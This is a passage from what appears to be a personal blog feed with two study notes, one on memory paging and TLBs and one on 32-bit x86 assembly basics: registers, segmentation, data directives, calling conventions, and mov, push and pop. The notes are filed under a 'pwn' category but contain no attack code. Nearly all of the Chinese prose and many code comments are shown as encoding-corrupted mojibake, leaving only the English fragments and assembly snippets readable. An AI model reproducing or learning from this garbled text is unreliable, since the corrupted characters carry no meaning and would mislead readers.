ä¸ºç¡¬ç›˜çš„è®¿é—®é€Ÿåº¦è¦æ¯”å†…å­˜æ…¢å¤ªå¤šäº†ï¼Œæ¯ä¸€æ¬¡å†…å­˜äº¤æ¢ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æŠŠä¸€å¤§æ®µè¿ç»­çš„å†…å­˜æ•°æ®å†™åˆ°ç¡¬ç›˜ä¸Šã€‚</p><p>æ‰€ä»¥ï¼Œ<strong>å¦‚æœå†…å­˜äº¤æ¢çš„æ—¶å€™ï¼Œäº¤æ¢çš„æ˜¯ä¸€ä¸ªå å†…å­˜ç©ºé—´å¾ˆå¤§çš„ç¨‹åºï¼Œè¿™æ ·æ•´ä¸ªæœºå™¨éƒ½ä¼šæ˜¾å¾—å¡é¡¿ã€‚</strong></p><h3 id="å†…å­˜åˆ†é¡µ"><a href="#å†…å­˜åˆ†é¡µ" class="headerlink" title="å†…å­˜åˆ†é¡µ"></a>å†…å­˜åˆ†é¡µ</h3><p>ä¸ºäº†è§£å†³å†…å­˜åˆ†æ®µçš„å†…å­˜ç¢ç‰‡å’Œå†…å­˜äº¤æ¢æ•ˆç‡ä½çš„é—®é¢˜ï¼Œå°±å‡ºç°äº†å†…å­˜åˆ†é¡µã€‚<strong>åˆ†é¡µæ˜¯æŠŠæ•´ä¸ªè™šæ‹Ÿå’Œç‰©ç†å†…å­˜ç©ºé—´åˆ‡æˆä¸€æ®µæ®µå›ºå®šå°ºå¯¸çš„å¤§å°</strong>ã€‚è¿™æ ·ä¸€ä¸ªè¿ç»­å¹¶ä¸”å°ºå¯¸å›ºå®šçš„å†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å«<strong>é¡µ</strong>ï¼ˆ<em>Page</em>ï¼‰</p><p>è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´é€šè¿‡é¡µè¡¨æ¥æ˜ å°„ï¼š</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-e63c20d1bace757600fccb051a29eaf6_720w.webp"></p><p>é¡µå­˜å‚¨åœ¨å†…å­˜é‡Œï¼Œç”±CPUçš„å†…å­˜ç®¡ç†å•å…ƒå³MMUè´Ÿè´£æ˜ å°„è½¬æ¢çš„å·¥ä½œå—ï¼Œè¿™æ ·CPU å°±å¯ä»¥ç›´æ¥é€šè¿‡ MMUï¼Œæ‰¾å‡ºè¦å®é™…è¦è®¿é—®çš„ç‰©ç†å†…å­˜åœ°å€ã€‚</p><p>ç”±äºå†…å­˜ç©ºé—´éƒ½æ˜¯é¢„å…ˆåˆ’åˆ†å¥½çš„ï¼Œä¹Ÿå°±ä¸ä¼šåƒåˆ†æ®µä¼šäº§ç”Ÿé—´éš™éå¸¸å°çš„å†…å­˜ã€‚é‡‡ç”¨äº†åˆ†é¡µï¼Œé‚£ä¹ˆé‡Šæ”¾çš„å†…å­˜éƒ½æ˜¯ä»¥é¡µä¸ºå•ä½é‡Šæ”¾çš„ï¼Œä¹Ÿå°±ä¸ä¼šäº§ç”Ÿæ— æ³•ç»™è¿›ç¨‹ä½¿ç”¨çš„å°å†…å­˜ã€‚</p><p>å¦‚æœå†…å­˜ç©ºé—´ä¸å¤Ÿï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠå…¶ä»–æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸­çš„ã€Œæœ€è¿‘æ²¡è¢«ä½¿ç”¨ã€çš„å†…å­˜é¡µé¢ç»™é‡Šæ”¾æ‰ï¼Œä¹Ÿå°±æ˜¯æš‚æ—¶å†™åœ¨ç¡¬ç›˜ä¸Šï¼Œç§°ä¸º<strong>æ¢å‡º</strong>ï¼ˆ<em>Swap Out</em>ï¼‰ã€‚ä¸€æ—¦éœ€è¦çš„æ—¶å€™ï¼Œå†åŠ è½½è¿›æ¥ï¼Œç§°ä¸º<strong>æ¢å…¥</strong>ï¼ˆ<em>Swap In</em>ï¼‰ã€‚æ‰€ä»¥ï¼Œä¸€æ¬¡æ€§å†™å…¥ç£ç›˜çš„ä¹Ÿåªæœ‰å°‘æ•°çš„ä¸€ä¸ªé¡µæˆ–è€…å‡ ä¸ªé¡µï¼Œä¸ä¼šèŠ±å¤ªå¤šæ—¶é—´ï¼Œå†…å­˜äº¤æ¢çš„æ•ˆç‡å°±ç›¸å¯¹æ¯”è¾ƒé«˜ã€‚</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-23f19a580a47fa6c731b32d7df6b6735_720w.webp"></p><p>åœ¨åˆ†é¡µæœºåˆ¶ä¸‹ï¼Œè™šæ‹Ÿåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œ<strong>é¡µå·</strong>å’Œ<strong>é¡µå†…åç§»</strong>ã€‚é¡µå·ä½œä¸ºé¡µè¡¨çš„ç´¢å¼•ï¼Œ<strong>é¡µè¡¨</strong>åŒ…å«ç‰©ç†é¡µæ¯é¡µæ‰€åœ¨<strong>ç‰©ç†å†…å­˜çš„åŸºåœ°å€</strong>ï¼Œè¿™ä¸ªåŸºåœ°å€ä¸é¡µå†…åç§»çš„ç»„åˆå°±å½¢æˆäº†ç‰©ç†å†…å­˜åœ°å€</p><h4 id="å…¶ä»–ä¸œè¥¿"><a href="#å…¶ä»–ä¸œè¥¿" class="headerlink" title="å…¶ä»–ä¸œè¥¿"></a>å…¶ä»–ä¸œè¥¿</h4><p>å†æ¥ï¼Œä¸ºäº†è§£å†³ç®€å•åˆ†é¡µäº§ç”Ÿçš„é¡µè¡¨è¿‡å¤§çš„é—®é¢˜ï¼Œå°±æœ‰äº†<strong>å¤šçº§é¡µè¡¨</strong>ï¼Œå®ƒè§£å†³äº†ç©ºé—´ä¸Šçš„é—®é¢˜ï¼Œä½†è¿™å°±ä¼šå¯¼è‡´ CPU åœ¨å¯»å€çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æœ‰å¾ˆå¤šå±‚è¡¨å‚ä¸ï¼ŒåŠ å¤§äº†æ—¶é—´ä¸Šçš„å¼€é”€ã€‚äºæ˜¯æ ¹æ®ç¨‹åºçš„<strong>å±€éƒ¨æ€§åŸç†</strong>ï¼Œåœ¨ CPU èŠ¯ç‰‡ä¸­åŠ å…¥äº† <strong>TLB</strong>ï¼Œè´Ÿè´£ç¼“å­˜æœ€è¿‘å¸¸è¢«è®¿é—®çš„é¡µè¡¨é¡¹ï¼Œå¤§å¤§æé«˜äº†åœ°å€çš„è½¬æ¢é€Ÿåº¦ã€‚</p><hr><p>å†²æµªå†²åˆ°çš„ï¼Œæˆ‘è§‰å¾—æ¯”èµ·æ¯ç‡¥çš„æ–‡å­—ï¼Œè¿™ä¸ªæ›´å¥½ç†è§£</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-29_21-54-52.png"></p><hr><p>ä¹‹å‰è§‰å¾—è‡ªå·±å¾ˆç‰›ç›´æ¥å¼€å§‹åšé¢˜ï¼Œé ä¸€äº›è€æœ¬è¿˜æ˜¯èƒ½åšå‡ é“é¢˜ï¼Œä½†æœ€è¿‘å‘ç°åç§»é‡å’Œå†…å­˜åœ°å€å•¥çš„æ ¹æœ¬ä¸ä¼šçœ‹ä¹Ÿä¸ä¼šç®—ï¼Œè¿˜æ˜¯è€è€å®å®æ‰“åŸºç¡€å­ğŸ˜³</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86æ±‡ç¼–åŸºç¡€</title>
    <link href="/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>32bitçš„x86æ±‡ç¼–åŸºç¡€ï¼ŒåŒ…æ‹¬ä¸€äº›å¸¸è§„æŒ‡ä»¤ï¼Œå†…å­˜å’Œå¯»å€æ¨¡å¼</p><span id="more"></span><p>æ€»è§‰å¾—å­¦äº†åˆå¥½åƒæ²¡å­¦Â·Â·Â·Â·Â·Â·</p><h1 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h1><p><img src="/img/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86-registers.png"></p><p>ç°ä»£ x86 å¤„ç†å™¨æœ‰ 8 ä¸ª 32 bit å¯„å­˜å™¨ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><p>å¯„å­˜å™¨åå­—æ˜¯æ—©æœŸè®¡ç®—æœºå†å²ä¸Šæµä¼ ä¸‹æ¥çš„ã€‚</p><ul><li>EAXï¼šä¸€èˆ¬ç”¨ä½œç´¯åŠ å™¨(Accumulator)</li><li>EBXï¼šä¸€èˆ¬ç”¨ä½œåŸºå€å¯„å­˜å™¨(Base)</li><li>ECXï¼šä¸€èˆ¬ç”¨æ¥è®¡æ•°(Count)</li><li>EDXï¼šä¸€èˆ¬ç”¨æ¥å­˜æ”¾æ•°æ®(Data)</li><li>ESIï¼šä¸€èˆ¬ç”¨ä½œæºå˜å€(Source Index)</li><li>EDIï¼šä¸€èˆ¬ç”¨ä½œç›®æ ‡å˜å€(Destinatin Index)</li><li>ESPï¼šä¸€èˆ¬ç”¨ä½œå †æ ˆæŒ‡é’ˆ(Stack Pointer)</li><li>EBPï¼šä¸€èˆ¬ç”¨ä½œåŸºå€æŒ‡é’ˆ(Base Pointer)</li></ul><p>ç°åœ¨å¤§éƒ¨åˆ†å¯„å­˜å™¨çš„åå­—å·²ç»å¤±å»äº†åŸæ¥çš„æ„ä¹‰ï¼Œä½†æœ‰ä¸¤ä¸ªæ˜¯ä¾‹å¤–ï¼š<strong>æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆStack Pointerï¼‰ESP å’ŒåŸºå€å¯„å­˜å™¨ï¼ˆ Base Pointerï¼‰EBP</strong>ã€‚</p><p>å¯¹äº <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> å››ä¸ªå¯„å­˜å™¨ï¼Œå¯ä»¥å†å°† 32bit åˆ’åˆ†æˆå¤šä¸ªå­å¯„å­˜å™¨ï¼Œ æ¯ä¸ªå­å¯„å­˜å™¨æœ‰ä¸“é—¨çš„åå­—ã€‚ä¾‹å¦‚ <code>EAX</code> çš„é«˜ 16bit å« <code>AX</code>ï¼ˆå»æ‰ E, æ®è¯´Eè¡¨ç¤º Extendedï¼‰,ä½ 8bit å« <code>AL</code> (Lowï¼‰, 8-16bit å« <code>AH</code> ï¼ˆHighï¼‰ã€‚</p><p>åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œè¿™äº›å¯„å­˜å™¨çš„åå­—æ˜¯<strong>å¤§å°å†™æ— å…³</strong>çš„ï¼Œæ—¢å¯ä»¥ç”¨ <code>EAX</code>ï¼Œä¹Ÿå¯ä»¥å†™ <code>eax</code>ã€‚</p><h1 id="å†…å­˜å’Œå¯»å€æ¨¡å¼"><a href="#å†…å­˜å’Œå¯»å€æ¨¡å¼" class="headerlink" title="å†…å­˜å’Œå¯»å€æ¨¡å¼"></a>å†…å­˜å’Œå¯»å€æ¨¡å¼</h1><h3 id="ç¨‹åºé‡å®šä½"><a href="#ç¨‹åºé‡å®šä½" class="headerlink" title="ç¨‹åºé‡å®šä½"></a>ç¨‹åºé‡å®šä½</h3><ul><li>å­˜æ”¾ç¨‹åºçš„ä¸ºä»£ç æ®µï¼Œå­˜æ”¾æ•°æ®çš„ä¸ºæ•°æ®æ®µ</li><li>çœŸå®çš„å†…å­˜å•å…ƒåœ°å€ç§°ä¸ºç‰©ç†åœ°å€ï¼Œè€Œç¨‹åºä¸­çš„åœ°å€ä¸ºé€»è¾‘åœ°å€</li></ul><p>ç”±äºç¨‹åºå¹¶ä¸çŸ¥é“è‡ªå·±ä¼šè¢«åŠ è½½åˆ°å“ªï¼Œå› æ­¤è®¿å­˜å¦‚æœç”¨ç»å¯¹åœ°å€å°†ä¼šå‡ºé”™ï¼Œåœ¨æ‰§è¡Œç¨‹åºæ—¶å°±éœ€è¦<strong>ç¨‹åºé‡å®šä½</strong>è¿™ä¸ªæ“ä½œã€‚</p><p>è¯¥æ“ä½œåœ¨æ±‡ç¼–ä¸­é€šè¿‡<code>org</code>æŒ‡ä»¤å®ç°ï¼Œå¦‚<code>org 0A100h</code>ä»£è¡¨è¯¥ç¨‹åºä¸­çš„æ‰€æœ‰æ ‡å·éƒ½ä»¥<code>0A100h</code>åšåç§»ã€‚</p><h3 id="å†…å­˜åˆ†æ®µ"><a href="#å†…å­˜åˆ†æ®µ" class="headerlink" title="å†…å­˜åˆ†æ®µ"></a>å†…å­˜åˆ†æ®µ</h3><p>å°†å†…å­˜åˆ†æ®µåï¼Œç¨‹åºåªéœ€è¦è¯†åˆ«åç§»åœ°å€å°±å¯ä»¥ç¡®å®šæ•°æ®ä½ç½®ã€‚ç¨‹åºé‡å®šä½é€šè¿‡è®¾ç½®ä»£ç æ®µCSå¯„å­˜å™¨å’Œæ•°æ®æ®µDSå¯„å­˜å™¨å®ç°ã€‚</p><p>åœ¨8086ä¸­ï¼Œåœ°å€æ€»çº¿æ˜¯20ä½çš„ï¼Œéœ€è¦å°†æ®µå¯„å­˜å™¨å·¦ç§»4ä½ï¼ˆ<code>0x10h</code>ï¼Œç›¸å½“äº16è¿›åˆ¶å·¦ç§»1ä½ï¼‰å˜ä¸º20ä½ï¼Œç„¶åå†åŒåç§»åœ°å€ç›¸åŠ ã€‚</p><p>ä¸¤ç§å…¸å‹æƒ…å†µ</p><ul><li>å› ä¸ºæ®µå¯„å­˜å™¨æ˜¯16ä½çš„ï¼Œåœ¨æ®µä¸é‡å çš„æƒ…å†µä¸‹ï¼Œæœ€å¤šå¯ä»¥å°†1MBçš„å†…å­˜åˆ†æˆ65536ä¸ªæ®µï¼Œæ¯ä¸ªæ®µ16Bï¼Œåç§»åœ°å€ä»<code>0000H</code>åˆ°<code>000FH</code></li><li>åŒæ ·åœ¨ä¸å…è®¸æ®µä¹‹é—´é‡å çš„æƒ…å†µä¸‹ï¼Œå› ä¸ºåç§»åœ°å€ä¹Ÿæ˜¯16ä½ï¼Œ1MBçš„å†…å­˜æœ€å¤šåªèƒ½åˆ’åˆ†æˆ16ä¸ªæ®µï¼Œæ¯æ®µé•¿64KBï¼Œæ®µåœ°å€ç”±<code>0000H</code>åˆ°<code>F000H</code></li></ul><h3 id="å£°æ˜é™æ€æ•°æ®åŒº"><a href="#å£°æ˜é™æ€æ•°æ®åŒº" class="headerlink" title="å£°æ˜é™æ€æ•°æ®åŒº"></a>å£°æ˜é™æ€æ•°æ®åŒº</h3><p><code>.DATA</code>ï¼šå£°æ˜é™æ€å­˜å‚¨åŒº</p><p>æ•°æ®ç±»å‹ä¿®é¥°è¯­ï¼š</p><p><code>DB/db</code>ï¼šByte,1Byte</p><p><code>DW/dw</code>ï¼šWord,2Byte</p><p><code>DD/dd</code>ï¼šDouble Word,4Bytes</p><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.DATA<br>var     DB 64    ; å£°æ˜ä¸€ä¸ª byte å€¼, referred to as location var, containing the value 64.<br>var2    DB ?     ; å£°æ˜ä¸€ä¸ªæœªåˆå§‹åŒ– byte å€¼, referred to as location var2.<br>        DB 10    ; å£°æ˜ä¸€ä¸ªæ²¡æœ‰ label çš„ byte å€¼, containing the value 10. Its location is var2 + 1.<br>X       DW ?     ; å£°æ˜ä¸€ä¸ª 2-byte æœªåˆå§‹åŒ–å€¼, referred to as location X.<br>Y       DD 30000 ; å£°æ˜ä¸€ä¸ª 4-byte å€¼, referred to as location Y, initialized to 30000.<br></code></pre></td></tr></table></figure><p><strong>åœ¨æ±‡ç¼–ä¸­åªæœ‰ä¸€ç»´æ•°ç»„</strong>ï¼Œæ²¡æœ‰äºŒç»´å’Œå¤šç»´æ•°ç»„ã€‚ä¸€ç»´æ•°ç»„å…¶å®å°±æ˜¯å†…å­˜ä¸­çš„ä¸€å—è¿ç»­åŒºåŸŸã€‚<code>DUP</code> å’Œå­—ç¬¦ä¸²å¸¸é‡ä¹Ÿæ˜¯å£°æ˜æ•°ç»„çš„ä¸¤ç§æ–¹æ³•ã€‚</p><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Z       DD 1, 2, 3      ; å£°æ˜ 3 ä¸ª 4-byte values, åˆå§‹åŒ–ä¸º 1, 2, and 3. The value of location Z + 8 will be 3.<br>bytes   DB 10 DUP(?)    ; å£°æ˜ 10 ä¸ª uninitialized bytes starting at location bytes.<br>arr     DD 100 DUP(0)   ; å£°æ˜ 100 ä¸ª 4-byte words starting at location arr, all initialized to 0<br>str     DB &#x27;hello&#x27;,0    ; å£°æ˜ 6 bytes starting at the address str, åˆå§‹åŒ–ä¸º hello and the null (0) byte.<br></code></pre></td></tr></table></figure><h3 id="å†…å­˜å¯»å€"><a href="#å†…å­˜å¯»å€" class="headerlink" title="å†…å­˜å¯»å€"></a>å†…å­˜å¯»å€</h3><p>æœ‰å¤šä¸ªæŒ‡ä»¤å¯ä»¥ç”¨äºå†…å­˜å¯»å€ã€‚å¦‚æœè¦è®¿é—®æŸä¸€å¤§å°çš„å†…å­˜ï¼Œåˆ™é€šè¿‡æ·»åŠ ä¿®é¥°è¯<code>byte</code>ã€<code>word</code>ã€<code>dword</code>å®ç°ã€‚</p><p>ğŸŒ°ï¼š</p><p>å…¶ä¸­<code>MOV</code> å°†åœ¨å†…å­˜å’Œå¯„å­˜å™¨ä¹‹é—´ç§»åŠ¨æ•°æ®ï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®çš„åœ°ï¼Œç¬¬äºŒä¸ªæ˜¯æºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov byte[ebx], 2<br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°è°ƒç”¨-call-å †æ ˆç»„ç»‡"><a href="#å‡½æ•°è°ƒç”¨-call-å †æ ˆç»„ç»‡" class="headerlink" title="å‡½æ•°è°ƒç”¨(call)å †æ ˆç»„ç»‡"></a>å‡½æ•°è°ƒç”¨(call)å †æ ˆç»„ç»‡</h3><h4 id="Callerè§„åˆ™"><a href="#Callerè§„åˆ™" class="headerlink" title="Callerè§„åˆ™"></a>Callerè§„åˆ™</h4><ol><li>åœ¨è°ƒç”¨å‡½æ•°&#x2F;å­ç¨‹åº(subroutine)ä¹‹å‰ï¼Œå…ˆä¿å­˜ç‰¹å®šå¯„å­˜å™¨çš„çŠ¶æ€(caller-saved)ï¼ˆåŒ…æ‹¬<code>eax</code>ã€<code>ecx</code>ã€<code>edx</code>ï¼‰</li><li>å°†è¦ä¼ çš„å‚æ•°å †æ ˆï¼ˆæ³¨æ„è¦é€†åºï¼Œ<strong>æœ€åä¸€ä¸ªå‚æ•°æœ€å…ˆå…¥</strong>ï¼‰ã€‚å› ä¸ºæ ˆå¾€ä¸‹ç”Ÿé•¿ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å­˜åœ¨æœ€ä½çš„åœ°å€</li><li>è°ƒç”¨å‡½æ•°ï¼Œ<code>call</code>ä¼šå°†è¿”å›åœ°å€<code>eip</code>å‹å…¥æ ˆä¸­</li><li>è¿”å›æ—¶å…ˆæŠŠå‚æ•°ç§»å‡ºæ ˆï¼Œç„¶åå°†åŸæ¥ä¿å­˜çš„å¯„å­˜å™¨å†popå‡ºæ¥</li></ol><h4 id="Calleeè§„åˆ™"><a href="#Calleeè§„åˆ™" class="headerlink" title="Calleeè§„åˆ™"></a>Calleeè§„åˆ™</h4><ol><li><p>å°†<code>ebp</code>æ¨å…¥æ ˆï¼Œå°†<code>esp</code>çš„å€¼æ‹·è´å…¥<code>ebp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp, esp<br></code></pre></td></tr></table></figure></li><li><p>åˆ†é…å±€éƒ¨å˜é‡ï¼Œæ ˆç”±ä¸Šå‘ä¸‹å¢é•¿ï¼Œå¦‚åˆ†é…3ä¸ª4Bï¼Œåˆ™<code>sub esp, 12</code></p></li><li><p>ä¿å­˜å¯„å­˜å™¨çŠ¶æ€</p></li></ol><h1 id="å¸¸è§æŒ‡ä»¤"><a href="#å¸¸è§æŒ‡ä»¤" class="headerlink" title="å¸¸è§æŒ‡ä»¤"></a>å¸¸è§æŒ‡ä»¤</h1><p>æœºå™¨æŒ‡ä»¤é€šå¸¸åˆ†ä¸ºä¸‰ç±»ï¼šæ•°æ®ç§»åŠ¨ã€ç®—æœ¯&#x2F;é€»è¾‘å’Œæ§åˆ¶æµã€‚</p><p>æ¥ä¸‹æ¥çš„ç¬¦å·è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;reg32&gt; ; ä»»ä½•32ä½å¯„å­˜å™¨ ï¼ˆEAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBPï¼‰<br>&lt;reg16&gt;; ä»»ä½•16ä½å¯„å­˜å™¨ ï¼ˆAX, BX, CX, or DXï¼‰<br>&lt;reg8&gt;; ä»»ä½•8ä½å¯„å­˜å™¨ ï¼ˆAH, BH, CH, DH, AL, BL, CL, or DLï¼‰<br>&lt;reg&gt;; ä»»ä½•å¯„å­˜å™¨<br>&lt;mem&gt;; ä¸€ä¸ªå†…å­˜åœ°å€ ï¼ˆe.g., [eax], [var + 4], or dword ptr [eax+ebx]ï¼‰<br>&lt;con32&gt;; ä»»ä½•32ä½å¸¸é‡<br>&lt;con16&gt;; ä»»ä½•16ä½å¸¸é‡<br>&lt;con8&gt;; ä»»ä½•8ä½å¸¸é‡<br>&lt;con&gt;; ä»»ä½•8ã€16ã€32ä½å¸¸é‡<br></code></pre></td></tr></table></figure><h2 id="æ•°æ®ç§»åŠ¨"><a href="#æ•°æ®ç§»åŠ¨" class="headerlink" title="æ•°æ®ç§»åŠ¨"></a>æ•°æ®ç§»åŠ¨</h2><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>movæŒ‡ä»¤å°†ç¬¬äºŒæ“ä½œå¯¹è±¡ï¼ˆå¯„å­˜å™¨ã€å†…å­˜å†…å®¹æˆ–æ˜¯å¸¸é‡å€¼ï¼‰æ‰€å¼•ç”¨çš„æ•°æ®é¡¹å¤åˆ¶åˆ°å…¶ç¬¬ä¸€æ“ä½œå¯¹è±¡ï¼ˆå¯„å­˜å™¨æˆ–æ˜¯å†…å­˜ï¼‰æ‰€å¼•ç”¨çš„ä½ç½®ã€‚</p><p>å¯„å­˜å™¨åˆ°å¯„å­˜å™¨çš„ç§»åŠ¨æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯ç›´æ¥å†…å­˜åˆ°å†…å­˜çš„ç§»åŠ¨æ˜¯ä¸åˆæ³•çš„ã€‚åœ¨éœ€è¦å†…å­˜ä¼ è¾“çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»é¦–å…ˆå°†æºå†…å­˜ä¸­çš„å†…å®¹åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œç„¶åæ‰èƒ½å°†å…¶å­˜å‚¨åˆ°ç›®æ ‡å†…å­˜åœ°å€ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov &lt;reg&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;mem&gt;<br>mov &lt;mem&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;const&gt;<br>mov &lt;mem&gt;,&lt;const&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax, ebx ; å°†EBXä¸­çš„å€¼å¤åˆ¶åˆ°EAX<br>mov byte ptr [var], 5 ; å°†5å­˜å‚¨åˆ°åœ°å€varçš„ä¸€ä¸ªå­—èŠ‚ä¸­<br></code></pre></td></tr></table></figure><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>ESPï¼ˆå †æ ˆæŒ‡é’ˆï¼‰é€šè¿‡pushé€’å‡ã€‚</p><p>pushæŒ‡ä»¤å°†å…¶æ“ä½œå¯¹è±¡æ”¾åœ¨å†…å­˜ä¸­ç¡¬ä»¶æ”¯æŒå †æ ˆçš„é¡¶éƒ¨ã€‚å…·ä½“åœ°è¯´ï¼ŒPUSHé¦–å…ˆå°†ESPé€’å‡4ï¼Œç„¶åå°†å…¶æ“ä½œå¯¹è±¡æ”¾å…¥å†…å­˜åœ°å€[ESP]å¤„çš„32ä½å¤§å°çš„åŒºåŸŸä¸­ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push &lt;reg32&gt;<br>push &lt;mem&gt;<br>push &lt;con32&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax ; å°†eaxå…¥æ ˆ<br>push [var] ; å°†åœ°å€varå¤„å¼€å§‹çš„4ä¸ªå­—èŠ‚å…¥æ ˆ<br></code></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>popæŒ‡ä»¤å°†4å­—èŠ‚æ•°æ®å…ƒç´ ä»ç¡¬ä»¶æ”¯æŒçš„å †æ ˆé¡¶éƒ¨ç§»è‡³æŒ‡å®šçš„æ“ä½œå¯¹è±¡ï¼ˆå³å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ï¼‰ã€‚å®ƒé¦–å…ˆå°†ä½äºå†…å­˜ä½ç½®[SP]çš„4ä¸ªå­—èŠ‚ç§»åŠ¨åˆ°æŒ‡å®šçš„å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ï¼Œç„¶åå°†SPé€’å¢4ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop &lt;reg32&gt;<br>pop &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop edi ; å°†å †æ ˆçš„é¡¶éƒ¨å…ƒç´ å¼¹å‡ºåˆ°EDIä¸­<br>pop [ebx] ; å°†å †æ ˆçš„é¡¶éƒ¨å…ƒç´ å¼¹å‡ºåˆ°å†…å­˜ä»EBXä½ç½®å¼€å§‹çš„å››ä¸ªå­—èŠ‚ä¸­<br></code></pre></td></tr></table></figure><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>leaæŒ‡ä»¤å°†å…¶ç¬¬äºŒä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šçš„åœ°å€æ”¾å…¥å…¶<strong>ç¬¬ä¸€ä¸ªæ“ä½œå¯¹è±¡æŒ‡å®šçš„å¯„å­˜å™¨ä¸­</strong>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå†…å­˜ä½ç½®çš„å†…å®¹ä¸ä¼šè¢«åŠ è½½ï¼Œå¹¶ä¸”åªæœ‰æœ‰æ•ˆåœ°å€ä¼šè¢«è®¡ç®—å¹¶æ”¾å…¥å¯„å­˜å™¨ä¸­ã€‚è¿™å¯¹äºè·å–æŒ‡å‘å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆéå¸¸æœ‰ç”¨ã€‚</p><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea 